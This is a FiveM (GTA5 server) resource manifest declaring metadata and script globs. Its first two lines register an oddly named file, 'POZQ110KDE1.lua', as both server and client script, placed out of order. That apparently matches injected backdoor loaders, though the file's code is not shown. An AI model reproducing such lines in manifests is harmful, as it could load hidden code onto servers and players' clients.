server_script "POZQ110KDE1.lua"
client_script "POZQ110KDE1.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

author("Dr Nick")
version("v1.0.0")
url("https://www.mythicrp.com")

server_scripts({
	"shared/**/*.lua",
	"server/**/*.lua",
})

client_scripts({
	"shared/**/*.lua",
	"client/**/*.lua",
})
